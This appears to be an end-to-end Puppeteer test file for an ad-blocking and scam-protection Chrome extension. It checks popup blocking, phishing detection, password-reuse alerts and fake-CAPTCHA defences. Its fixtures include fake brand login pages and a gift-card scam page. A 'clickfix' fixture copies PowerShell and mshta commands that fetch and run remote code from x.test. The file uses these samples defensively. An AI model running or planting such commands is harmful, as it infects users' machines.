// End-to-end test in a real Chrome. Run: npm install && npm run test:e2e
// Set CHROME_PATH to the Chrome binary on macOS/Linux. Some checks need internet.
import puppeteer from "puppeteer-core";
import http from "node:http";
import path from "node:path";
import { readFile, writeFile, rm, mkdir } from "node:fs/promises";
import { fileURLToPath } from "node:url";

const EXT = process.argv[2] || path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const CHROME = process.env.CHROME_PATH || "C:/Program Files/Google/Chrome/Application/chrome.exe";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const results = [];
const check = (name, ok, info = "") => {
  results.push({ name, ok });
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${info ? "  — " + info : ""}`);
};

/* ---------- test pages ---------- */
const AD_BOX = `<div class="promo-box" id="promo-wrap" style="width:300px;height:280px;border:1px solid #ccc">
  <span>Advertisement</span>
  <iframe src="http://127.0.0.1:PORT/frame" width="300" height="250" style="border:0"></iframe></div>`;
const PAGE = `<!doctype html><html><head><title>t</title></head><body>
<div id="AD_300" style="width:300px;height:250px;background:red">generic ad</div>
<div class="sidebar-promo" id="promo" style="width:200px;height:50px">my banner</div>
<div class="card" id="sponsored-card"><p>Great shoes</p><small>Sponsored</small></div>
<div class="card" id="normal-card"><p>Normal article text</p></div>
<button id="btn">Open</button>
<p id="text">plain text</p>
<article><h1>Real content</h1><p>Lorem ipsum dolor sit amet.</p></article>
${AD_BOX}
</body></html>`;

const LOGIN = (title) => `<!doctype html><html><head><title>${title}</title></head><body>
  <h1>${title}</h1><form><input name="u" id="u"><input type="password" id="pw"><button>Log in</button></form></body></html>`;
const PAGES = {
  "/frame": "<body style='margin:0;background:#fc0'>ad creative</body>",
  "/login-paypal": LOGIN("PayPal: Log in"),
  "/login-monzo": LOGIN("Monzo – Log in"),
  "/login-generic": LOGIN("Members area"),
  "/plain": "<!doctype html><title>Welcome</title><p>Hello there, welcome to our page.</p>",
  "/clickfix": `<!doctype html><title>Verify</title><h2>Verify you are human</h2>
    <p>1. Press Windows + R  2. Press Ctrl + V  3. Press Enter</p>
    <button id="verify" onclick="navigator.clipboard.writeText('powershell -w hidden -c iwr http://x.test/a.ps1 | iex # I am not a robot - reCAPTCHA ID 2771')">I'm not a robot</button>
    <textarea id="hidden" style="position:absolute;left:-9999px">mshta https://x.test/verify.hta # Cloudflare verification</textarea>
    <button id="verify2" onclick="const t=document.getElementById('hidden');t.focus();t.select();document.execCommand('copy')">Verify</button>`,
  "/docs": `<!doctype html><title>Install</title><p>Install Scoop from a PowerShell window:</p>
    <button id="copy" onclick="navigator.clipboard.writeText('iwr -useb get.scoop.sh | iex')">Copy</button>`,
  "/giftcard": `<!doctype html><title>Notice</title><main><h1>Final notice</h1>
    <p>Your social security number has been suspended. To avoid arrest you must pay the fine today with Google Play gift cards.</p>
    <p>Scratch the back of the card and read the code to the officer immediately.</p></main>`,
};
const MODAL = (body, delay) => `<!doctype html><title>News</title><style>
  .bd{position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:9998}
  .md{position:fixed;top:20%;left:30%;width:40%;padding:24px;background:#fff;z-index:9999;font-family:sans-serif}</style>
  <h1>Markets rally as inflation cools</h1><p>Long article text about the economy and markets. More text follows here.</p>
  <script>
  function openNag(){document.body.style.overflow='hidden';
    document.body.insertAdjacentHTML('beforeend','<div class="bd" id="bd"></div><div class="md" id="md" role="dialog">${body}</div>');
    const no=document.getElementById('no'); if(no) no.onclick=()=>{window.__dismissed=true;document.getElementById('md').remove();document.getElementById('bd').remove();document.body.style.overflow='';};}
  ${delay ? `setTimeout(openNag, ${delay});` : ""}
  </script><button id="sub" onclick="openNag()">Subscribe</button>`;
PAGES["/nag"] = MODAL(`<b>CYBER SALE</b><p><s>$89</s> $49.99 For Your First Year</p><p>Get trusted news, expert analysis, and more—for less than $1/week.</p><button>Redeem Offer</button><button id=no>No Thanks</button>`, 800);
PAGES["/nag-x"] = MODAL(`<button aria-label=Close>×</button><h2>Subscribe to our newsletter</h2><p>Unlimited access for £1/week. Don't miss out!</p><input placeholder=Email><button>Sign up</button>`, 800);
PAGES["/nag-user"] = MODAL(`<h2>Subscribe</h2><p>Unlimited access for $1/week. Special offer!</p><button id=no>No Thanks</button>`, 0);
const server = http.createServer((req, res) => {
  res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
  const page = PAGES[req.url.split("?")[0]];
  res.end(page || PAGE.replace("PORT", String(server.address().port)));
}).listen(0);
const port = server.address().port;
const URL1 = `http://localhost:${port}/`;

// Scriptlet fixture: the real runtime with test data for "localhost".
const runtime = await readFile(path.join(EXT, "src/content/scriptlets-runtime.js"), "utf8");
await mkdir(path.join(EXT, "tests/fixtures"), { recursive: true });
await writeFile(path.join(EXT, "tests/fixtures/scriptlet-test.js"), runtime.replace("/*__BLK_DATA__*/null", JSON.stringify({
  calls: { localhost: [["set", "blkTest.flag", "true"], ["aopr", "blkAbort"], ["json-prune", "ads"], ["nostif", "adblock"]] },
  off: {},
})));

const browser = await puppeteer.launch({
  executablePath: CHROME, headless: true, pipe: true, enableExtensions: true,
  // Fake domains for phishing tests resolve to the local test server.
  args: ["--no-first-run", "--host-resolver-rules=MAP *.test 127.0.0.1, MAP www.paypal.com 127.0.0.1"],
  protocolTimeout: 30000,
});
try {
  const extId = await browser.installExtension(EXT);
  check("extension installs", !!extId, extId);

  const sw = await browser.waitForTarget((t) => t.type() === "service_worker" && t.url().includes(extId));
  const worker = await sw.worker();
  const swErrors = [];
  worker.on("console", (m) => m.type() === "error" && swErrors.push(m.text()));
  await sleep(4000); // registration of many scriptlet shards

  const registered = await worker.evaluate(async () => (await chrome.scripting.getRegisteredContentScripts()).map((s) => s.id));
  check("page script + generic CSS registered", registered.includes("blk-main") && registered.includes("blk-generic"));
  const shards = registered.filter((id) => id.startsWith("blk-sl-")).length;
  check("scriptlet shards registered", shards > 20, `${shards} shards`);
  const rulesets = await worker.evaluate(() => chrome.declarativeNetRequest.getEnabledRulesets());
  check("all rulesets enabled", ["blocklist", "security", "ads", "privacy", "annoyances"].every((r) => rulesets.includes(r)), rulesets.join(","));
  const waitFor = async (fn, ms = 15000) => {
    const end = Date.now() + ms;
    while (Date.now() < end) { const v = await fn(); if (v) return v; await sleep(300); }
    return null;
  };
  const dyn = await waitFor(async () => {
    const r = await worker.evaluate(() => chrome.declarativeNetRequest.getDynamicRules());
    return r.some((x) => x.id >= 1000) ? r : null;
  });
  check("dangerous-site redirect rules installed", !!dyn, `${dyn ? dyn.length : 0} dynamic rules`);

  // Test-only scriptlet fixture on localhost.
  await worker.evaluate(() => chrome.scripting.registerContentScripts([{
    id: "test-scriptlets", js: ["tests/fixtures/scriptlet-test.js"], matches: ["http://localhost/*"],
    runAt: "document_start", world: "MAIN",
  }]));

  const page = await browser.newPage();
  let dialogs = 0;
  page.on("dialog", async (d) => { dialogs++; await d.dismiss(); });
  await page.goto(URL1, { waitUntil: "load" });
  await sleep(2500); // smart detection runs after load

  /* --- scam / popup protection --- */
  check("window.open without click is blocked", await page.evaluate(() => window.open("https://example.com") === null));
  check("about:blank iframe bypass is blocked", await page.evaluate(() => {
    const f = document.createElement("iframe");
    document.body.appendChild(f);
    return f.contentWindow.open("https://example.com") === null;
  }));
  await page.evaluate(() => {
    const a = document.createElement("a");
    a.href = "https://example.com"; a.target = "_blank";
    document.body.appendChild(a);
    a.click();
  });
  await sleep(500);
  check("synthetic target=_blank click opens nothing", (await browser.pages()).length === 2);

  await page.evaluate(() => {
    document.getElementById("btn").onclick = () => { window.__opened = window.open("about:blank") !== null; window.__second = window.open("about:blank") !== null; };
  });
  await page.click("#btn");
  const [opened, second] = await page.evaluate(() => [window.__opened, window.__second]);
  check("real button click may open ONE window", opened === true && second === false);
  for (const p of await browser.pages()) if (p !== page) await p.close();
  await page.bringToFront();

  await page.evaluate(() => { document.body.onclick = () => { window.__bodyOpen = window.open("about:blank") !== null; }; });
  await page.click("#text");
  check("click on plain text can't open a window", (await page.evaluate(() => window.__bodyOpen)) === false);
  check("window.open looks native", await page.evaluate(() => /\[native code\]/.test(window.open.toString())));
  check("notification prompt denied", (await page.evaluate(() => Notification.requestPermission())) === "denied");
  await page.evaluate(() => { for (let i = 0; i < 6; i++) alert("YOUR PC IS INFECTED " + i); });
  check("alert loop stopped after 2", dialogs === 2, `${dialogs} shown`);
  check("fullscreen hijack blocked", (await page.evaluate(() => document.body.requestFullscreen().then(() => "allowed", (e) => e.name))) === "NotAllowedError");
  const histLen = await page.evaluate(() => { const s = history.length; for (let i = 0; i < 40; i++) history.pushState({}, "", "#" + i); return history.length - s; });
  check("back-button trap limited", histLen <= 11, `${histLen} entries`);

  /* --- ad blocking engine --- */
  const display = (sel) => page.$eval(sel, (e) => getComputedStyle(e).display);
  check("generic banner hidden (lists)", (await display("#AD_300")) === "none");
  check("normal content still visible", (await display("#text")) === "block" && (await display("article")) === "block");
  const adsense = await page.evaluate(() => new Promise((res) => {
    const s = document.createElement("script");
    s.src = "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js";
    s.onload = () => res(window.adsbygoogle && window.adsbygoogle.loaded === true && !("pageState" in window.adsbygoogle) ? "stub" : "real");
    s.onerror = () => res("blocked");
    document.head.appendChild(s);
  }));
  check("network ad script blocked or neutralised", adsense === "blocked" || adsense === "stub", adsense);
  const tracker = await page.evaluate(() =>
    fetch("https://www.google-analytics.com/g/collect?v=2", { mode: "no-cors" }).then(() => "loaded", () => "blocked"));
  check("tracker request blocked", tracker === "blocked", tracker);

  // Smart detection: label + third-party ad-size iframe, no list knows ".promo-box"
  check("smart: unknown ad box auto-detected", (await display("#promo-wrap")) === "none");
  check("smart: normal card untouched", (await display("#normal-card")) === "block");
  const learnedSites = await worker.evaluate(async () => (await chrome.storage.local.get("learnedSites")).learnedSites || {});
  check("smart: ad remembered for this site", (learnedSites.localhost || []).length > 0, JSON.stringify(learnedSites));
  const nets = await worker.evaluate(async () => (await chrome.storage.local.get("learnedNetworks")).learnedNetworks || {});
  check("smart: serving network recorded", !!nets["127.0.0.1"] || Object.keys(nets).length > 0, Object.keys(nets).join(","));

  // Cross-site learning: same network on 3 sites → blocked everywhere.
  await worker.evaluate(async () => {
    for (const site of ["https://news-a.test/", "https://blog-b.test/", "https://shop-c.test/"]) {
      await kinguard.learn({ url: site }, null, ["ads.unknown-network.test"]);
    }
  });
  await sleep(1500);
  const learnedRule = (await worker.evaluate(() => chrome.declarativeNetRequest.getDynamicRules())).find((r) => r.id === 4);
  check("learning: network blocked after 3 sites", !!learnedRule && learnedRule.condition.requestDomains.includes("unknown-network.test"));

  // Procedural engine (isolated world)
  const tabId = await worker.evaluate(async (u) => (await chrome.tabs.query({})).find((t) => t.url.startsWith(u)).id, URL1);
  const proc = await worker.evaluate(async (id) => {
    const [{ result }] = await chrome.scripting.executeScript({ target: { tabId: id }, func: () => {
      const r1 = BlkProcedural.run(BlkProcedural.compile(".card:has-text(Sponsored)"), [document]).map((e) => e.id);
      const r2 = BlkProcedural.run(BlkProcedural.compile("small:has-text(/^Sponsored$/):upward(1)"), [document]).map((e) => e.id);
      const r3 = BlkProcedural.run(BlkProcedural.compile(".card:not(:has-text(Sponsored))"), [document]).map((e) => e.id);
      return { r1, r2, r3 };
    } });
    return result;
  }, tabId);
  check("procedural :has-text", JSON.stringify(proc.r1) === '["sponsored-card"]', JSON.stringify(proc));
  check("procedural :upward + regex", JSON.stringify(proc.r2) === '["sponsored-card"]');
  check("procedural :not(:has-text)", JSON.stringify(proc.r3) === '["normal-card"]');

  // Scriptlets runtime (fixture)
  const sl = await page.evaluate(() => {
    let aborted = false;
    try { void window.blkAbort; } catch { aborted = true; }
    window.blkTest = {};
    const pruned = JSON.parse('{"ads":[1],"keep":2}');
    return { set: window.blkTest.flag === true, aborted, pruned: !("ads" in pruned) && pruned.keep === 2 };
  });
  check("scriptlet set-constant", sl.set);
  check("scriptlet abort-on-property-read", sl.aborted);
  check("scriptlet json-prune", sl.pruned);

  // Redirect resources (stand-in scripts)
  const gpt = await page.evaluate(() => new Promise((res) => {
    const s = document.createElement("script");
    s.src = "https://securepubads.g.doubleclick.net/tag/js/gpt.js";
    s.onload = () => res(window.googletag && window.googletag.apiReady === true ? "stub" : "loaded-real");
    s.onerror = () => res("blocked");
    document.head.appendChild(s);
  }));
  check("ad script swapped for harmless stand-in", gpt === "stub", gpt);

  // removeparam (tracking tags)
  await page.goto(URL1 + "?utm_source=newsletter&id=7", { waitUntil: "load" });
  const cleaned = page.url();
  check("tracking tags stripped from URL", !cleaned.includes("utm_source") && cleaned.includes("id=7"), cleaned);

  /* --- popup counters --- */
  await page.bringToFront();
  await worker.evaluate(() => chrome.action.openPopup());
  const popupTarget = await browser.waitForTarget((t) => t.url().endsWith("popup/popup.html"), { timeout: 5000 }).catch(() => null);
  if (popupTarget) {
    const popup = await popupTarget.asPage();
    await sleep(1500);
    const counts = await popup.evaluate(() => ({
      hidden: document.getElementById("hiddenCount").textContent,
      smart: document.getElementById("smartRow").hidden ? "hidden" : document.getElementById("smartCount").textContent,
    }));
    check("popup shows banners hidden", Number(counts.hidden) >= 1, JSON.stringify(counts));
    await popup.close();
  } else check("popup opens", false);

  /* --- dangerous & user-blocked sites --- */
  const dangerous = (await worker.evaluate(async () => (await (await fetch("/rules/security-hosts.json")).json()).slice(0, 1)))[0];
  const p3 = await browser.newPage();
  await p3.goto(`http://${dangerous}/`, { waitUntil: "load", timeout: 15000 }).catch(() => {});
  await sleep(800);
  check("dangerous site shows warning page", p3.url().includes("/src/blocked/blocked.html"), `${dangerous} → ${p3.url().slice(0, 80)}`);
  const title = await p3.$eval("#title", (e) => e.textContent).catch(() => "");
  check("warning page explains the danger", /harm/i.test(title), title);

  await worker.evaluate(async () => { await chrome.storage.sync.set({ blocklist: ["example.com"] }); });
  await waitFor(async () => (await worker.evaluate(() => chrome.declarativeNetRequest.getDynamicRules())).some((r) => r.id === 3));
  await p3.goto("https://example.com/", { waitUntil: "load", timeout: 15000 }).catch(() => {});
  await sleep(800);
  const userTitle = await p3.$eval("#title", (e) => e.textContent).catch(() => "");
  check("user-blocked site shows 'You blocked this site'", /You blocked/.test(userTitle), userTitle);

  /* --- scam & fraud guards --- */
  const stat = async (kind) => (await worker.evaluate(async () => (await chrome.storage.local.get("stats")).stats || {}))[kind] || 0;
  const hasWarning = (p) => p.evaluate(() => !!document.querySelector("kinguard-warning"));
  const visit = async (url, wait = 2500) => {
    const p = await browser.newPage();
    await p.goto(url, { waitUntil: "load" }).catch(() => {});
    await sleep(wait);
    return p;
  };
  const ctx = browser.defaultBrowserContext();

  let before = await stat("phishing");
  let g = await visit(`http://paypal-secure-login.test:${port}/login-paypal`);
  check("phishing: fake PayPal login warned", (await hasWarning(g)) && (await stat("phishing")) > before);
  await g.close();

  before = await stat("phishing");
  g = await visit(`http://paypa1.test:${port}/plain`);
  check("phishing: digit look-alike (paypa1) warned", (await hasWarning(g)) && (await stat("phishing")) > before);
  await g.close();

  before = await stat("phishing");
  g = await visit(`http://xn--pple-43d.test:${port}/plain`); // "аpple" with a Cyrillic а
  check("phishing: homograph (Cyrillic аpple) warned", (await hasWarning(g)) && (await stat("phishing")) > before);
  await g.close();

  const wd = await worker.evaluate(() => kinguard.officialSite("Monzo"));
  check("wikidata: official website lookup works", wd.includes("monzo.com"), JSON.stringify(wd));
  before = await stat("phishing");
  g = await visit(`http://monzo-account.test:${port}/login-monzo`, 6000);
  check("phishing: unknown brand checked via Wikidata (Monzo)", (await hasWarning(g)) && (await stat("phishing")) > before, "needs internet");
  await g.close();

  // Domain analysis, incl. real sites and near-miss words that must NOT warn.
  // (Real brand domains like paypal.com are HSTS-preloaded, so they can't be faked over http here.)
  const plainTab = await visit(`http://docs.test:${port}/plain`, 500);
  const plainId = await worker.evaluate(async () => (await chrome.tabs.query({ url: "http://docs.test/*" }))[0].id);
  const verdicts = await worker.evaluate(async (id) => {
    const [{ result }] = await chrome.scripting.executeScript({ target: { tabId: id }, func: () => {
      const v = (h, pw) => { const r = BlkGuard.analyzeHost(h, pw); return r ? `${r.brand.name}:${r.level}` : "ok"; };
      const hex = (b) => [...b].map((x) => x.toString(16).padStart(2, "0")).join("");
      return {
        sha: hex(BlkGuard.sha256(new TextEncoder().encode("abc"))) === "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad" &&
          hex(BlkGuard.sha256(new TextEncoder().encode("x".repeat(1000)))).length === 64,
        real: ["www.paypal.com", "accounts.google.co.uk", "signin.ebay.de", "login.microsoftonline.com", "appleid.apple.com"].map((h) => v(h)),
        fake: ["paypal.com.secure-login.top", "amazom-login.com", "micros0ft-support.com", "xn--pple-43d.com", "netflix-billing-update.xyz"].map((h) => v(h, true)),
        safe: ["finance.com", "revolt.com", "apple-recipes.com", "pineapple.com", "chase-the-dream.com", "steamcleaning.com"].map((h) => v(h)),
      };
    } });
    return result;
  }, plainId);
  await plainTab.close();
  check("password: built-in SHA-256 correct (for http pages)", verdicts.sha === true);
  check("phishing: real brand domains not flagged", verdicts.real.every((x) => x === "ok"), verdicts.real.join(","));
  check("phishing: fake brand domains flagged", verdicts.fake.every((x) => x !== "ok"), verdicts.fake.join(","));
  check("phishing: look-alike words don't cause false alarms", verdicts.safe.every((x) => x === "ok"), verdicts.safe.join(","));

  // Password alert: seed the fingerprint exactly as the content script does on paypal.com.
  await worker.evaluate(async () => {
    let { pwSalt } = await chrome.storage.local.get("pwSalt");
    if (!pwSalt) { pwSalt = "testsalt"; await chrome.storage.local.set({ pwSalt }); }
    const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(pwSalt + "\u0000" + "Sup3r-Secret-99"));
    const f = [...new Uint8Array(buf)].slice(0, 12).map((b) => b.toString(16).padStart(2, "0")).join("");
    await chrome.storage.local.set({ pwPrints: { PayPal: { f, n: 15, site: "paypal.com" } } });
  });

  before = await stat("password");
  g = await visit(`http://members-area.test:${port}/login-generic`);
  await g.type("#pw", "Sup3r-Secret-99");
  await sleep(1200);
  check("password: reuse on another site alerted", (await hasWarning(g)) && (await stat("password")) > before);
  await g.close();

  before = await stat("clickfix");
  // Clipboard APIs need a secure context: localhost / 127.0.0.1 qualify.
  const cfUrl = `http://localhost:${port}/clickfix`;
  await ctx.overridePermissions(`http://localhost:${port}`, ["clipboard-read", "clipboard-write", "clipboard-sanitized-write"]);
  g = await visit(cfUrl, 1000);
  await g.click("#verify");
  await sleep(800);
  const clip1 = await g.evaluate(() => navigator.clipboard.readText());
  check("clickfix: malicious writeText replaced", clip1.startsWith("STOP!"), clip1.slice(0, 40));
  check("clickfix: warning shown", (await hasWarning(g)) && (await stat("clickfix")) > before);
  await g.close(); // the warning now covers that page; use a fresh one for the second trick
  g = await visit(cfUrl, 1000);
  await g.evaluate(() => navigator.clipboard.writeText("reset"));
  await g.click("#verify2");
  await sleep(500);
  const clip2 = await g.evaluate(() => navigator.clipboard.readText());
  check("clickfix: execCommand('copy') path replaced", clip2.startsWith("STOP!"), clip2.slice(0, 40));
  await g.close();

  await ctx.overridePermissions(`http://127.0.0.1:${port}`, ["clipboard-read", "clipboard-write", "clipboard-sanitized-write"]);
  g = await visit(`http://127.0.0.1:${port}/docs`, 1000);
  await g.click("#copy");
  await sleep(500);
  check("clickfix: legit docs copy button untouched", (await g.evaluate(() => navigator.clipboard.readText())).includes("scoop"));
  await g.close();

  before = await stat("scam");
  g = await visit(`http://notice.test:${port}/giftcard`);
  check("scam: gift-card payment demand flagged", (await hasWarning(g)) && (await stat("scam")) > before);
  await g.close();
  g = await visit(`http://docs.test:${port}/plain`);
  check("no warnings on a normal page", !(await hasWarning(g)));
  await g.close();

  // Settings switch: turning the fake-CAPTCHA guard off really turns it off.
  await worker.evaluate(async () => { await chrome.storage.sync.set({ guards: { clickfix: false } }); });
  await waitFor(async () => (await worker.evaluate(async () =>
    (await chrome.scripting.getRegisteredContentScripts({ ids: ["blk-main"] }))[0]?.js.length === 2)));
  g = await visit(cfUrl, 1000);
  await g.click("#verify");
  await sleep(500);
  check("settings: clickfix guard can be switched off", (await g.evaluate(() => navigator.clipboard.readText())).includes("powershell"));
  await g.close();
  await worker.evaluate(async () => { await chrome.storage.sync.set({ guards: {} }); });

  /* --- subscription / newsletter popups --- */
  before = await stat("nag");
  g = await visit(`http://news-site.test:${port}/nag`, 3000);
  const nag1 = await g.evaluate(() => ({ dismissed: !!window.__dismissed, modal: !!document.getElementById("md"), scroll: getComputedStyle(document.body).overflow }));
  check("popups: 'CYBER SALE … No Thanks' auto-dismissed via its own button", nag1.dismissed && !nag1.modal, JSON.stringify(nag1));
  check("popups: counted", (await stat("nag")) > before);
  await g.close();
  g = await visit(`http://news-site.test:${port}/nag-x`, 3000);
  const nag2 = await g.evaluate(() => ({ modal: !!document.getElementById("md") && getComputedStyle(document.getElementById("md")).display !== "none", backdrop: !!document.getElementById("bd"), scroll: getComputedStyle(document.body).overflow }));
  check("popups: newsletter box with only × closed, page scrolls again", !nag2.modal && !nag2.backdrop && nag2.scroll !== "hidden", JSON.stringify(nag2));
  await g.close();
  g = await visit(`http://news-site.test:${port}/nag-user`, 1000);
  await g.click("#sub");
  await sleep(2500);
  check("popups: a box YOU opened stays open", await g.evaluate(() => !!document.getElementById("md")));
  await g.close();

  /* --- AI / deepfake videos + fact checks --- */
  const ytTab = await visit(`http://docs.test:${port}/plain`, 500);
  const ytTabId = await worker.evaluate(async () => (await chrome.tabs.query({ url: "http://docs.test/*" }))[0].id);
  const yt = await worker.evaluate(async (id) => {
    const [{ result }] = await chrome.scripting.executeScript({ target: { tabId: id }, func: () => ({
      scam: BlkYouTube.assess({ title: "Elon Musk LIVE: Bitcoin giveaway – send BTC and get 2x back", live: true }).flagged,
      health: BlkYouTube.assess({ title: "Dr Oz: this one weird trick reverses diabetes in 7 days" }).flagged,
      invest: BlkYouTube.assess({ title: "Martin Lewis reveals: Quantum AI trading platform pays guaranteed returns" }).flagged,
      news: BlkYouTube.assess({ title: "Elon Musk interview: Tesla, SpaceX and the Bitcoin price" }).flagged,
      mrbeast: BlkYouTube.assess({ title: "MrBeast gives away $1,000,000 to strangers" }).flagged,
      cooking: BlkYouTube.assess({ title: "How to cook pasta like an Italian grandma" }).flagged,
      label: BlkYouTube.hasAiLabel("How this content was made · Altered or synthetic content · Sound or visuals were significantly edited"),
      noLabel: BlkYouTube.hasAiLabel("Is AI changing music forever? My honest opinion"),
    }) });
    return result;
  }, ytTabId);
  await ytTab.close();
  check("deepfake: celebrity crypto giveaway flagged", yt.scam);
  check("deepfake: celebrity miracle-cure flagged", yt.health);
  check("deepfake: celebrity investment scam flagged", yt.invest);
  check("deepfake: normal celebrity news NOT flagged", !yt.news && !yt.mrbeast && !yt.cooking, JSON.stringify(yt));
  check("AI label: YouTube's disclosure recognised", yt.label && !yt.noLabel);

  const headline = "Deutsche Bank Leak Reveals $582 Million In Epstein Payments, Accidental Trump Tax Disclosure";
  const fcUrl = await worker.evaluate((h) => [BLK.factCheckUrl("google", "the moon is made of cheese"), BLK.factCheckUrl("factcheck", h),
    BLK.factCheckUrl("chatgpt", "y", "https://a.test/"), BLK.factCheckUrl("news", h), BLK.keywords(h)], headline);
  check("fact check: URLs built", fcUrl[0].startsWith("https://www.google.com/search?q=the%20moon") && fcUrl[1].startsWith("https://toolbox.google.com/factcheck/") &&
    fcUrl[2].startsWith("https://chatgpt.com/?q=") && fcUrl[3].startsWith("https://news.google.com/search?q="), fcUrl.slice(0, 4).join(" | "));
  check("fact check: headline shortened to keywords", fcUrl[4] === "Deutsche Bank $582 Epstein Payments", fcUrl[4]);
  await worker.evaluate(() => kinguard.openCheck("factcheck", "drinking bleach cures covid", null, null));
  const fcTab = await waitFor(async () => (await browser.pages()).find((p) => p.url().includes("toolbox.google.com/factcheck")), 8000);
  check("fact check: opens in a new tab", !!fcTab);
  if (fcTab) await fcTab.close();

  // Real YouTube: the "Check facts" button appears under the title (needs internet).
  const ytp = await browser.newPage();
  await ytp.setViewport({ width: 1280, height: 900 });
  await ytp.goto("https://www.youtube.com/watch?v=jNQXAC9IVRw", { waitUntil: "load" }).catch(() => {});
  await sleep(6000);
  // A fresh browser gets YouTube's EU cookie-consent screen over everything: dismiss it.
  await ytp.evaluate(() => {
    const b = [...document.querySelectorAll("button")].find((x) => /reject all/i.test(x.textContent));
    if (b) b.click();
  }).catch(() => {});
  await sleep(3000);
  const ytButton = await ytp.evaluate(() => !!document.querySelector("ytd-watch-metadata kinguard-check")).catch(() => false);
  check("youtube: 'Check facts' button shown on real YouTube", ytButton, ytp.url().slice(0, 60));
  check("youtube: no false deepfake/AI warning on a normal video", !(await hasWarning(ytp)));
  if (ytButton) {
    // Buttons live in a closed shadow root: locate them through CDP and click by position.
    const cdp = await ytp.createCDPSession();
    const { root } = await cdp.send("DOM.getDocument", { depth: -1, pierce: true });
    const buttons = [];
    const walk = (n) => {
      if (n.nodeName === "BUTTON" && buttons.length < 10) buttons.push(n);
      for (const c of [...(n.children || []), ...(n.shadowRoots || [])]) walk(c);
    };
    const host = (function find(n) {
      if (n.nodeName === "KINGUARD-CHECK") return n;
      for (const c of [...(n.children || []), ...(n.shadowRoots || [])]) { const f = find(c); if (f) return f; }
      return null;
    })(root);
    if (host) walk(host);
    const expected = ["www.google.com/search", "chatgpt.com", "news.google.com", "toolbox.google.com/factcheck"];
    const results = [];
    for (let i = 0; i < Math.min(buttons.length, 4); i++) {
      await cdp.send("DOM.scrollIntoViewIfNeeded", { backendNodeId: buttons[i].backendNodeId });
      await sleep(300);
      const { model } = await cdp.send("DOM.getBoxModel", { backendNodeId: buttons[i].backendNodeId });
      const [x1, y1, , , x3, y3] = model.content;
      const newTab = new Promise((res) => browser.once("targetcreated", (t) => res(t)));
      await ytp.mouse.click((x1 + x3) / 2, (y1 + y3) / 2);
      const t = await Promise.race([newTab, sleep(5000).then(() => null)]);
      results.push(t ? t.url() : "nothing");
      if (t) { const p = await t.page().catch(() => null); if (p) await p.close().catch(() => {}); }
    }
    check("youtube: Google / ChatGPT / News / Fact-check buttons each open their tab",
      results.length === 4 && results.every((u, i) => u.includes(expected[i])), results.map((u) => u.slice(0, 45)).join(" | "));
  }
  await ytp.close();

  /* --- allowlist turns everything off --- */
  await worker.evaluate(async () => { await chrome.storage.sync.set({ blocklist: [], allowlist: ["localhost"] }); });
  await waitFor(async () => (await worker.evaluate(async () =>
    (await chrome.scripting.getRegisteredContentScripts({ ids: ["blk-main"] }))[0]?.excludeMatches?.length > 0)));
  await sleep(500);
  await page.goto(URL1, { waitUntil: "load" });
  await sleep(2000);
  check("allowlisted: popups allowed", await page.evaluate(() => { const w = window.open("about:blank"); if (w) w.close(); return w !== null; }));
  check("allowlisted: generic CSS off", (await display("#AD_300")) === "block");
  check("allowlisted: smart detection off", (await display("#promo-wrap")) === "block");

  /* --- UI pages --- */
  for (const pth of ["src/popup/popup.html", "src/options/options.html", "src/blocked/blocked.html#https://x.test/"]) {
    const p = await browser.newPage();
    const errs = [];
    p.on("pageerror", (e) => errs.push(e.message));
    p.on("console", (m) => m.type() === "error" && errs.push(m.text()));
    await p.goto(`chrome-extension://${extId}/${pth}`, { waitUntil: "load" });
    await sleep(800);
    check(`${pth.split("#")[0]} renders cleanly`, errs.length === 0, errs.join(" | "));
    if (process.env.SHOTS) await p.screenshot({ path: path.join(process.env.SHOTS, path.basename(pth.split("#")[0]) + ".png"), fullPage: true });
  }

  check("no service worker errors", swErrors.length === 0, swErrors.slice(0, 3).join(" | "));
} finally {
  await browser.close();
  server.close();
  await rm(path.join(EXT, "tests/fixtures"), { recursive: true, force: true });
}
const failed = results.filter((r) => !r.ok).length;
console.log(`\n${results.length - failed}/${results.length} passed`);
process.exit(failed ? 1 : 0);
